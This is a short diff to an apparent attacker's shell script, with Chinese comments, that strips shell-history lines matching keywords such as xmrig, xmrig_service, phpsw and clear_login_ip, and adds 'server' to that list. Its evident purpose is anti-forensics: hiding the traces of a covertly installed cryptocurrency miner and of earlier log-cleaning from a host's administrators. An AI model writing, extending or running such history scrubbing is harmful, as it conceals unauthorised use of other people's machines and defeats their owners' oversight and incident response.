@@ -10,7 +10,7 @@ history -w
 
 
 # 关键字，可根据需要修改
-KEYWORDS="xmrig|phpsw|xmrig_service|clear_login_ip|clen_keywords"
+KEYWORDS="xmrig|phpsw|xmrig_service|clear_login_ip|clen_keywords|server"
 
 # 删除包含关键词的命令
 grep -v -E "$KEYWORDS" "$HISTFILE" > "${HISTFILE}.new"
